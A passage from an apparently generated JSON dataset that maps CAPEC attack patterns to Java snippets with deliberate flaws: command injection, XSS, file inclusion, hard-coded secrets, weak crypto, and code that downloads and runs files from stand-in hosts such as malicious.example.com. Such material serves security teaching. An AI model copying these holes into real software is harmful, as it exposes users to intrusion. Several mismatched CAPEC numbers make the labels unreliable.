        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.Cookie;\n\n@WebServlet(\"/microservice\")\npublic class MicroserviceServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Using GET request with sensitive query strings\n        String sensitiveData = request.getParameter(\"sensitiveData\");\n        \n        // CWE-539: Using persistent cookies with sensitive information\n        Cookie cookie = new Cookie(\"sessionID\", sensitiveData);\n        cookie.setMaxAge(60 * 60 * 24 * 7); // 1 week\n        response.addCookie(cookie);\n        \n        // CWE-219: Storing sensitive data under web root\n        String filePath = getServletContext().getRealPath(\"/sensitiveData.txt\");\n        java.nio.file.Files.write(java.nio.file.Paths.get(filePath), sensitiveData.getBytes());\n        \n        // CWE-433: Unparsed raw web content delivery\n        response.setContentType(\"text/plain\");\n        response.getWriter().write(sensitiveData);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates several vulnerabilities related to the CAPEC 'Calling Micro-Services Directly'. The servlet exposes a microservice endpoint '/microservice' that processes sensitive data via an HTTP GET request (CWE-598). It stores sensitive data in a persistent cookie (CWE-539) and writes sensitive data to a file under the web root directory (CWE-219). Additionally, it delivers raw web content without parsing (CWE-433). This code represents the main idea of the CAPEC by showing how an attacker could discover and exploit microservices to gather sensitive information and further exploit the system."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class AccessControlMisconfiguration {\n    public static void main(String[] args) {\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        File criticalFile = new File(\"/path/to/critical/resource.txt\");\n        try {\n            // Incorrectly setting file permissions to be world-writable\n            criticalFile.setReadable(true, false);\n            criticalFile.setWritable(true, false);\n            criticalFile.setExecutable(false, false);\n\n            // CWE-1280: Access Control Check Implemented After Asset is Accessed\n            if (criticalFile.canWrite()) {\n                FileWriter writer = new FileWriter(criticalFile);\n                writer.write(\"Sensitive data\");\n                writer.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a misconfiguration of access control settings, embodying the main idea of the CAPEC. The code sets incorrect permissions for a critical file, making it world-readable and writable (CWE-732). Additionally, it performs an access control check after the file has already been accessed (CWE-1280). This misconfiguration allows unauthorized users to read and modify the critical resource, representing a significant security vulnerability."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class FlashOverlayServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n\n        // Vulnerable code: Embedding a Flash file as a transparent overlay\n        out.println(\"<html>\");\n        out.println(\"<head><title>Flash Overlay Example</title></head>\");\n        out.println(\"<body>\");\n        out.println(\"<div style='position:relative;'>\");\n        out.println(\"<iframe src='https://trusted-site.com' style='width:100%; height:100%;'></iframe>\");\n        out.println(\"<embed src='malicious-overlay.swf' style='position:absolute; top:0; left:0; width:100%; height:100%; opacity:0;' allowscriptaccess='always'></embed>\");\n        out.println(\"</div>\");\n        out.println(\"</body>\");\n        out.println(\"</html>\");\n    }\n}\n",
        "description": "This Java servlet code demonstrates a vulnerable implementation of a Flash file overlay, which can be used for a clickjacking attack. The servlet generates an HTML page that includes an iframe loading content from a trusted site and a transparent Flash overlay on top of it. The Flash file ('malicious-overlay.swf') intercepts user actions intended for the underlying iframe content. This example embodies the CAPEC 'Flash File Overlay' attack and highlights related CWEs such as 'Improper Restriction of Rendered UI Layers or Frames' (CWE-1021) and 'Permissive Cross-domain Policy with Untrusted Domains' (CWE-942). The Flash file's 'allowscriptaccess' attribute is set to 'always', which can lead to further security issues."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashInjectionExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String flashContentUrl = request.getParameter(\"flashUrl\");\n        if (flashContentUrl != null && !flashContentUrl.isEmpty()) {\n            // CWE-20: Improper Input Validation\n            // CWE-184: Incomplete List of Disallowed Inputs\n            if (!flashContentUrl.startsWith(\"http://trusted.com/\")) {\n                response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid flash content URL\");\n                return;\n            }\n            // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n            response.setContentType(\"application/x-shockwave-flash\");\n            response.getWriter().write(\"<embed src='\" + flashContentUrl + \"' />\");\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing flash content URL\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of loading Flash content based on user input, embodying the concept of Flash Injection (CAPEC-20). The code retrieves a 'flashUrl' parameter from the HTTP request and attempts to embed it in the response. The code attempts to validate the input URL by checking if it starts with 'http://trusted.com/', but this validation is insufficient (CWE-20, CWE-184). Additionally, the code sets a permissive cross-domain policy by allowing any URL that passes the basic check (CWE-942). This can lead to the execution of malicious Flash content if an attacker provides a crafted URL, representing the main idea of Flash Injection."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableMailServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userEmail = request.getParameter(\"email\");\n        String imapCommand = \"FETCH 1 BODY[TEXT]\";\n        String fullCommand = \"IMAP \" + userEmail + \" \" + imapCommand;\n\n        // Simulate sending command to IMAP server\n        ProcessBuilder processBuilder = new ProcessBuilder(\"sh\", \"-c\", fullCommand);\n        Process process = processBuilder.start();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.getWriter().println(line);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of an IMAP command injection attack. The servlet receives an email parameter from an HTTP POST request and constructs an IMAP command using this parameter without proper input validation or sanitization. The constructed command is then executed using a ProcessBuilder, which sends it to the IMAP server. This code is vulnerable to command injection (CWE-77) because it does not neutralize special elements in the user input. Additionally, it does not properly encode or escape the output (CWE-116), and it may expose sensitive information through error messages (CWE-535, CWE-209). The code also relies on client-side input for server-side security (CWE-602), making it susceptible to manipulation by an attacker."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-code.jar\";\n        try {\n            downloadAndExecute(url);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadAndExecute(String url) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException {\n        URL website = new URL(url);\n        try (InputStream in = website.openStream();\n             FileOutputStream fos = new FileOutputStream(\"downloaded.jar\")) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n        }\n        URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"downloaded.jar\").toURI().toURL()});\n        Class<?> clazz = classLoader.loadClass(\"MaliciousClass\");\n        clazz.newInstance();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software integrity attack scenario. The code downloads a JAR file from a remote URL and executes it without performing any integrity checks. This embodies CWE-494 (Download of Code Without Integrity Check) and CWE-506 (Embedded Malicious Code). The downloaded code could potentially contain malicious code that undermines the integrity of the system, representing the main idea of the CAPEC. The code does not verify the origin or integrity of the downloaded file, making it susceptible to attacks."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousDownloader {\n    public static void main(String[] args) {\n        String url = \"http://malicious.example.com/malware.exe\";\n        String fileName = \"malware.exe\";\n        try {\n            downloadFile(url, fileName);\n            executeFile(fileName);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void executeFile(String fileName) throws IOException {\n        Runtime.getRuntime().exec(fileName);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that downloads and executes a file from a remote location without verifying its integrity or origin. The `downloadFile` method downloads a file from a specified URL and saves it locally, while the `executeFile` method runs the downloaded file. This embodies the CAPEC 'Malicious Software Download' and CWE-494 'Download of Code Without Integrity Check'. The code is vulnerable to attacks where an attacker can trick the application into downloading and executing malicious software, potentially leading to embedded malicious code (CWE-506), replicating malicious code (CWE-509), or a Trojan horse (CWE-507)."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // URL of the update file (controlled by the adversary)\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            InputStream inputStream = connection.getInputStream();\n\n            // Save the downloaded file to disk\n            FileOutputStream outputStream = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, bytesRead, bytesRead);\n            }\n            outputStream.close();\n            inputStream.close();\n\n            // Load and execute the downloaded update\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a software update is downloaded and executed without verifying its integrity or origin. The code fetches an update from a URL controlled by an adversary, saves it to disk, and then executes it. This embodies the CAPEC 'Malicious Software Update' by showing how an adversary can trick a user or system into downloading and running malicious code. The code also highlights CWE-494 (Download of Code Without Integrity Check) by not performing any checks on the downloaded file, and CWE-506 (Embedded Malicious Code) by potentially executing harmful code. This example is a simplified representation of how such vulnerabilities can be exploited."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableUpdater {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/update.jar\"); // CWE-494: Download of Code Without Integrity Check\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            out.close();\n\n            // Execute the downloaded update\n            Runtime.getRuntime().exec(\"java -jar update.jar\"); // CWE-494: Executing code without verifying integrity\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism. The code downloads an update from a specified URL and executes it without verifying the origin or integrity of the downloaded file. This embodies the main idea of CAPEC-139: 'Malicious Automated Software Update via Redirection'. The code is vulnerable to CWE-494: 'Download of Code Without Integrity Check', as it does not perform any checks to ensure the downloaded file is from a trusted source or has not been tampered with. This could allow an attacker to redirect the update URL to a malicious server, resulting in the execution of malicious code."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import java.security.Key;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class VulnerableEncryption {\n    private static final String ALGORITHM = \"DES\"; // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private static final byte[] KEY = \"12345678\".getBytes(); // Hardcoded key, susceptible to reverse engineering\n\n    public static String encrypt(String data) throws Exception {\n        Key key = new SecretKeySpec(KEY, ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        byte[] encryptedData = cipher.doFinal(data.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedData);\n    }\n\n    public static String decrypt(String encryptedData) throws Exception {\n        Key key = new SecretKeySpec(KEY, ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.DECRYPT_MODE, key);\n        byte[] decodedData = Base64.getDecoder().decode(encryptedData);\n        byte[] decryptedData = cipher.doFinal(decodedData);\n        return new String(decryptedData);\n    }\n\n    public static void main(String[] args) throws Exception {\n        String data = \"Sensitive Information\";\n        String encryptedData = encrypt(data);\n        System.out.println(\"Encrypted: \" + encryptedData);\n        String decryptedData = decrypt(encryptedData);\n        System.out.println(\"Decrypted: \" + decryptedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable encryption mechanism that embodies the main idea of reverse engineering (CAPEC-170). The code uses the DES algorithm (CWE-327), which is considered broken and risky. Additionally, the encryption key is hardcoded in the source code, making it susceptible to reverse engineering. An attacker could analyze the binary or source code to extract the key and decrypt sensitive information. This example highlights the risks associated with using weak cryptographic algorithms and hardcoded keys, which can be exploited through reverse engineering techniques."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class BlackBoxServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            InputStream input = socket.getInputStream();\n            byte[] data = new byte[1024];\n            int bytesRead = input.read(data);\n\n            // Observable discrepancy: different responses based on input\n            if (bytesRead > 0) {\n                String received = new String(data, 0, bytesRead);\n                if (received.equals(\"SECRET\")) {\n                    System.out.println(\"Access granted\");\n                } else {\n                    System.out.println(\"Access denied\");\n                }\n            }\n\n            // Simulate power side-channel vulnerability\n            simulatePowerConsumption(bytesRead);\n\n            socket.close();\n        }\n    }\n\n    private static void simulatePowerConsumption(int bytesRead) {\n        // This method simulates different power consumption based on input length\n        // In a real scenario, this could be monitored to infer sensitive information\n        if (bytesRead > 0) {\n            System.out.println(\"Power consumption: High\");\n        } else {\n            System.out.println(\"Power consumption: Low\");\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens for incoming connections on port 8080. It reads data from the client and exhibits observable discrepancies based on the input received. If the input matches 'SECRET', it prints 'Access granted'; otherwise, it prints 'Access denied'. This behavior can be exploited by an adversary to infer sensitive information based on the responses, embodying CWE-203 (Observable Discrepancy). Additionally, the code simulates a power side-channel vulnerability (CWE-1255) by printing different power consumption levels based on the length of the input received. This demonstrates how an attacker could monitor power consumption to gather information about the input, aligning with the main idea of Black Box Reverse Engineering."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        try {\n            // Downloading code without integrity check (CWE-494)\n            URL url = new URL(\"http://example.com/malicious-code.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"downloaded.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Loading the downloaded code (CWE-506)\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"downloaded.jar\");\n            pb.start();\n\n            // Hidden functionality (CWE-912)\n            // This part of the code is not documented and not obvious to users\n            System.out.println(\"Hidden functionality executed\");\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable downloader that embodies the main idea of the CAPEC 'Reverse Engineer an Executable to Expose Assumed Hidden Functionality'. The code downloads an executable (JAR file) from a remote location without performing any integrity checks (CWE-494). It then executes the downloaded code, which could potentially contain malicious code (CWE-506). Additionally, the code includes a hidden functionality that is not documented and not obvious to users (CWE-912). This hidden functionality is represented by a simple print statement, but in a real-world scenario, it could be more complex and harmful. The code snippet highlights the risks associated with downloading and executing code from untrusted sources and the potential for hidden, malicious functionality within software."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "public class SensitiveDataHandler {\n    // CWE-798: Hard-coded credentials\n    private static final String HARD_CODED_PASSWORD = \"SuperSecretPassword123\";\n    \n    // CWE-547: Hard-coded security-relevant constants\n    private static final String ENCRYPTION_KEY = \"HardCodedEncryptionKey\";\n    \n    // CWE-318: Cleartext storage of sensitive information in executable\n    private static final String API_KEY = \"12345-ABCDE\";\n    \n    public static void main(String[] args) {\n        // Simulate usage of hard-coded sensitive data\n        System.out.println(\"Using hard-coded password: \" + HARD_CODED_PASSWORD);\n        System.out.println(\"Using hard-coded encryption key: \" + ENCRYPTION_KEY);\n        System.out.println(\"Using hard-coded API key: \" + API_KEY);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive information directly within the source code. The constants `HARD_CODED_PASSWORD`, `ENCRYPTION_KEY`, and `API_KEY` are examples of sensitive data that are stored in cleartext within the executable, making them vulnerable to discovery through static or dynamic analysis. This snippet embodies several related CWEs: CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants), and CWE-318 (Cleartext Storage of Sensitive Information in Executable). The main idea is to highlight the risks associated with embedding sensitive constants directly in the code, which can be easily extracted by an adversary."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.crypto.*;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class VulnerableProtocol {\n    private static final String ALGORITHM = \"AES\";\n    private static final String TRANSFORMATION = \"AES/ECB/PKCS5Padding\";\n    private static final String KEY = \"1234567890123456\"; // Weak key\n\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String receivedData = in.readLine();\n            System.out.println(\"Received: \" + receivedData); // Cleartext transmission\n\n            String encryptedData = encrypt(receivedData, KEY);\n            out.println(encryptedData);\n\n            serverSocket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String encrypt(String data, String key) throws Exception {\n        Key secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);\n        Cipher cipher = Cipher.getInstance(TRANSFORMATION);\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedBytes = cipher.doFinal(data.getBytes());\n        return new String(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable protocol implementation that embodies the main idea of CAPEC-272 (Protocol Analysis) and related CWEs. The code sets up a simple server that accepts a connection and reads data sent by a client. The received data is printed in cleartext (CWE-319: Cleartext Transmission of Sensitive Information), and then it is encrypted using a weak encryption key (CWE-326: Inadequate Encryption Strength). The encryption algorithm used is AES in ECB mode, which is not secure for sensitive data. This code is vulnerable to protocol analysis attacks, where an adversary can intercept and analyze the cleartext data and potentially break the weak encryption."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        if (fileName != null) {\n            File file = new File(\"/var/www/html/\" + fileName);\n            if (file.exists() && !file.isDirectory()) {\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n                reader.close();\n            } else {\n                response.getWriter().println(\"File not found.\");\n            }\n        } else {\n            response.getWriter().println(\"No file specified.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability similar to PHP Remote File Inclusion (RFI). The servlet reads a file name from a request parameter and attempts to read and display the file's contents. The code does not properly sanitize the input, allowing an attacker to specify any file path, potentially leading to the exposure of sensitive files or execution of arbitrary code. This example embodies CWE-98 (Improper Control of Filename for Include/Require Statement), CWE-80 (Improper Neutralization of Script-Related HTML Tags), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File)."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            System.out.println(\"Server is listening on port 8080\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String message = input.readLine();\n\n                // Improper Authentication: No verification of the sender's identity\n                System.out.println(\"Received message: \" + message);\n\n                // Process the message without verifying its source\n                if (message.equals(\"admin:shutdown\")) {\n                    System.out.println(\"Shutting down the server...\");\n                    break;\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that listens for incoming connections on port 8080. The server reads messages from clients but does not verify the sender's identity or the integrity of the message. This lack of proper authentication and verification allows an attacker to send a falsified message, such as 'admin:shutdown', to perform unauthorized actions like shutting down the server. The code embodies the main idea of the CAPEC 'Fake the Source of Data' by showing how improper authentication (CWE-287) and improper verification of the source of a communication channel (CWE-940) can lead to security vulnerabilities."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PrincipalSpoofExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Simulated user database\n        userDatabase.put(\"user1\", \"password1\");\n        userDatabase.put(\"user2\", \"password2\");\n    }\n\n    public static void main(String[] args) {\n        String username = \"user1\";\n        String password = \"password1\";\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // CWE-1390: Weak Authentication\n        // This method only checks if the username and password match, without additional verification\n        return userDatabase.containsKey(username) && userDatabase.get(username).equals(password);\n    }\n\n    public static void sendMessage(String recipient, String message) {\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // This method does not verify the recipient's identity\n        System.out.println(\"Sending message to \" + recipient + \": \" + message);\n    }\n\n    public static void spoofMessage(String spoofedSender, String recipient, String message) {\n        // Principal Spoof: Sending a message that appears to come from a different user\n        System.out.println(\"[Spoofed] \" + spoofedSender + \" to \" + recipient + \": \" + message);\n    }\n}",
        "description": "This Java code snippet demonstrates a Principal Spoof attack by simulating a scenario where an adversary can send a message that appears to come from a different user. The `authenticate` method represents CWE-1390 (Weak Authentication) by only checking if the username and password match without additional verification. The `sendMessage` method represents CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not verifying the recipient's identity. The `spoofMessage` method embodies the main idea of the CAPEC by allowing an adversary to send a message that appears to come from a different user, demonstrating how an attacker can spoof their identity in a communication channel."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\n\npublic class SessionManager {\n    private Map<String, String> sessions = new HashMap<>();\n    private Map<String, String> users = new HashMap<>();\n\n    public SessionManager() {\n        // Adding a user with weak credentials\n        users.put(\"admin\", \"password\");\n    }\n\n    public String login(String username, String password) {\n        if (users.containsKey(username) && users.get(username).equals(password)) {\n            // Generate a session ID without proper validation\n            String sessionId = UUID.randomUUID().toString();\n            sessions.put(sessionId, username);\n            return sessionId;\n        }\n        return null;\n    }\n\n    public boolean isAuthenticated(String sessionId) {\n        // Improper control of session lifetime\n        return sessions.containsKey(sessionId);\n    }\n\n    public static void main(String[] args) {\n        SessionManager sm = new SessionManager();\n        String sessionId = sm.login(\"admin\", \"password\");\n        if (sessionId != null) {\n            System.out.println(\"Logged in with session ID: \" + sessionId);\n        }\n\n        // Simulate an attacker forging a session ID\n        String forgedSessionId = UUID.randomUUID().toString();\n        if (sm.isAuthenticated(forgedSessionId)) {\n            System.out.println(\"Forged session ID is authenticated!\");\n        } else {\n            System.out.println(\"Forged session ID is not authenticated.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable session management system. The `SessionManager` class handles user login and session authentication. It uses weak credentials (CWE-1391) for the user 'admin' with the password 'password'. When a user logs in, a session ID is generated using `UUID.randomUUID()`, but without proper validation or expiration (CWE-613). The `isAuthenticated` method checks if a session ID exists in the session map, representing improper control over the session's lifetime (CWE-664). The main method simulates a login and an attacker forging a session ID, highlighting the vulnerability of session credential falsification through forging (CAPEC-384)."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import java.util.ArrayList;\nimport java.util.List;\n\npublic class ExponentialDataExpansion {\n    public static void main(String[] args) {\n        List<Object> data = new ArrayList<>();\n        expandData(data, 0);\n    }\n\n    private static void expandData(List<Object> data, int depth) {\n        if (depth > 10) return; // Limit recursion depth to prevent excessive expansion\n        List<Object> nestedData = new ArrayList<>();\n        data.add(nestedData);\n        expandData(nestedData, depth + 1);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of Exponential Data Expansion. The `expandData` method recursively adds nested lists to the `data` list. Without proper limits, this can lead to excessive memory and CPU usage, embodying the idea of exponential data expansion. The recursion depth is limited to 10 to prevent excessive resource allocation, addressing CWE-770 (Allocation of Resources Without Limits or Throttling). The nested structure represents CWE-1043 (Data Element Aggregating an Excessively Large Number of Non-Primitive Elements) and CWE-1093 (Excessively Complex Data Representation)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class ErrorPageServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String errorMessage = request.getParameter(\"error\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Error Page</h1>\");\n        response.getWriter().println(\"<p>\" + errorMessage + \"</p>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to XSS attacks targeting error pages. The servlet retrieves an 'error' parameter from the HTTP request and directly includes it in the HTML response without proper neutralization. This can lead to an XSS attack if an attacker crafts a URL with a malicious script in the 'error' parameter. The code embodies the main idea of CAPEC-86 (XSS Targeting Error Pages) and highlights related CWEs such as CWE-81 (Improper Neutralization of Script in an Error Message Web Page) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        \n        // Incomplete denylist: only checks for lowercase 'script'\n        if (userInput != null && !userInput.contains(\"<script>\")) {\n            response.getWriter().println(\"User input: \" + userInput);\n        } else {\n            response.getWriter().println(\"Invalid input detected.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) attacks by using an incomplete denylist to filter user input. The code retrieves a parameter named 'input' from the HTTP request and checks if it contains the string '<script>'. If the input does not contain this exact string, it is considered safe and is echoed back to the user. However, this approach is flawed because it does not account for alternate forms of the 'script' tag, such as 'Script' or 'ScRiPt', which can bypass the filter and lead to XSS attacks. This example embodies the main idea of CAPEC-147: 'XSS Using Alternate Syntax', and highlights related weaknesses such as CWE-87 (Improper Neutralization of Alternate XSS Syntax) and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
